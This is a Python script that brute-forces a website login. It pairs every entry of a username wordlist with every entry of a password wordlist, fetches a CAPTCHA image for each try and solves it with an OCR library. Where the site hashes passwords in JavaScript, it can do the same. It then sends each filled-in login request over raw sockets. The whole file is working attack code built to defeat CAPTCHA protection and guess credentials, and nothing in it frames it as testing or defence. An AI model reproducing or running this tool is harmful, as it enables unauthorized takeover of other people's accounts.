import base64
import socket
import json
import hashlib
import time
import execjs
import ddddocr


class http:
    def __init__(self,dataPath,userPath,pwdPath,codePath):
        self.dataPath = dataPath
        self.userPath = userPath
        self.pwdPath = pwdPath
        self.codePath = codePath

    def run(self):
        # wirte code
        login_ip_port = self.getInfo(self.dataPath)
        code_ip_port = self.getInfo(self.codePath)
        user_pwd = self.readDict(self.userPath,self.pwdPath)
        print(login_ip_port,"\n",code_ip_port)
        #code = self.loadCode(code_ip_port,"bin")
        ccList = []
        for i in user_pwd['users']:
            for j in user_pwd['pwds']:
                ccList.append({"user":i.strip(),"pwd":j.strip(),"code":""})
        print("user_pwd_len:",len(ccList))
        for info in ccList:
            info["code"]=self.loadCode(code_ip_port,"bin")
            print(info)
            self.sendHttp(info,login_ip_port)
            time.sleep(1)

    def loadCode(self,ip_port,mod):
        self.s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s2.connect((ip_port["ip"], ip_port["port"]))
        self.s2.sendall(ip_port["context"].encode())
        # 接收响应
        # 使用循环接收所有数据
        buffer_size = 4096  # 每次接收的最大字节数
        data = b''
        while True:
            part = self.s2.recv(buffer_size)
            data += part
            if not part:
                # 如果没有更多的数据，跳出循环
                break
        self.codeRes = self.SaveImg(data,mod)

        code = self.delectImg(self.codeRes["md5"])
        self.s2.close()
        return code



    def delectImg(self,path):
        ocr = ddddocr.DdddOcr(beta=True)

        with open(path, 'rb') as f:
            image = f.read()

        res = ocr.classification(image)
        return res


    def md5(self,string):
        md5_hash = hashlib.md5()
        md5_hash.update(string.encode('utf-8'))
        return md5_hash.hexdigest()


    def SaveImg(self,data,mod):
        out = data.decode(encoding='iso-8859-1').split("\r\n\r\n")[1]
        if mod=="b64":
            CodeRes = json.loads(out)
            img = CodeRes['img']
            CodeRes["md5"] = f"./temp/{self.md5(img)}.jpg"
            print(CodeRes["md5"])
            image_data = base64.b64decode(img)
            with open(CodeRes["md5"], 'wb') as f:
                f.write(image_data)
            return CodeRes
        elif mod=="bin":
            CodeRes= {}
            CodeRes["md5"] = f"./temp/{self.md5(out)}.jpg"
            print(CodeRes["md5"])
            with open(CodeRes["md5"], 'wb') as f:
                f.write(out.encode(encoding="iso-8859-1"))
            return CodeRes
    def readDict(self,userPath,pwdPath):
        with open(userPath,"r",encoding="utf-8") as f:
            users = f.readlines()
        with open(pwdPath, "r", encoding="utf-8") as f:
            pwds = f.readlines()
        user_pwd = {"users": users, "pwds": pwds}

        return user_pwd


    def pwdJsEncryt(self,pwd):
        script_file = './utils/PwdEncryt.js'  # 替换为实际的JavaScript文件路径
        with open(script_file, 'r',encoding="utf-8") as file:
            script_code = file.read()
        ctx = execjs.compile(script_code)
        result = ctx.call('hashPassword', pwd)  # 调用JavaScript函数
        print(result)  # 输出结果
        return result


    def sendHttp(self,cc,ip_port,encryt=0):
        tempUser = cc["user"]
        if encryt:
            tempPwd = self.pwdJsEncryt(cc["pwd"]).strip()
        else:
            tempPwd = cc["pwd"]
        tempCode = cc["code"]

        data = ip_port["context"]
        # print(data.encode())
        data = data.replace("{{u}}",tempUser)
        # print(data.encode())
        data = data.replace("{{p}}",tempPwd)
        # print(data.encode())
        data = data.replace("{{c}}",tempCode)
        # print(data.encode())
        print("-"*50+f"\n{data}\n"+"-"*50)
        self.s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s1.connect((ip_port["ip"], ip_port["port"]))
        self.s1.sendall(data.encode())
        # 接收响应
        buffer_size = 4096  # 每次接收的最大字节数
        data = b''
        while True:
            part = self.s1.recv(buffer_size)
            data += part
            if not part:
                # 如果没有更多的数据，跳出循环
                break
        # 打印响应
        print(data.decode(encoding="iso-8859-1"))
        self.s1.close()
        return

    def getInfo(self,dataPath):
        with open(dataPath,"r",encoding="utf-8") as f:

            context = f.read()
            res = context.split("\n")
            for i in res:
                if i.startswith("Host:"):
                    # 提取Host头的值
                    ip = i.split(":")[1].strip()
                    port = int(i.split(":")[2].strip())
                    # port = 443
                    ret = {"ip":ip,"port":port,"context":context}
            return ret



if __name__ == "__main__":
    a = http("./login.txt","./utils/user500.txt","./utils/pwd500.txt","./code.txt")
    a.run()
